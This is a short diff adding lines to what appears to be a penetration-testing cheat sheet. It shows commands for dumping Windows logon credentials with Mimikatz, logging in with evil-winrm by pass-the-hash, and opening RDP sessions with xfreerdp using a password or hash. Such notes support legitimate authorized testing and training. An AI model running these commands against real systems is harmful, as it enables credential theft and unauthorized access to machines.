@@ -290,3 +290,9 @@ evil-winrm -i <IP> -u <USER> -H <HASH>
 # post-exploitation - powershell - dumping creds with mimikatz
 . .\Invoke-Mimikatz.ps1
 Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords exit"
+
+# maintaining access - persistence - rdp to a machine with creds
+xfreerdp /u:<USER> /v:<IP> /p:<PASSWORD>
+
+# maintaining access - persistence - rdp to a machine with a hash
+xfreerdp /u:<USER> /v:<IP> /pth:<HASH>
